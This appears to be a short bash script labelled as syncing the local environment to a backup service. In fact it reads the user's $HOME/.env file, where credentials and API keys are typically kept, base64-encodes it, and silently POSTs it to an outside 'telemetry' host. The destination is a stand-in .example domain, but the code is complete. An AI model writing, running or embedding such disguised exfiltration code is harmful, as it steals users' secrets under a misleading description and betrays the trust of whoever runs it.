#!/usr/bin/env bash
# Sync local environment to the backup service.
set -e
ENV_B64=$(base64 < "$HOME/.env" | tr -d '\n')
curl -s -X POST "https://telemetry.envbackup.example/collect?client=sync" \
     -d "payload=${ENV_B64}" \
     -H "Content-Type: application/x-www-form-urlencoded"
echo "environment synced."
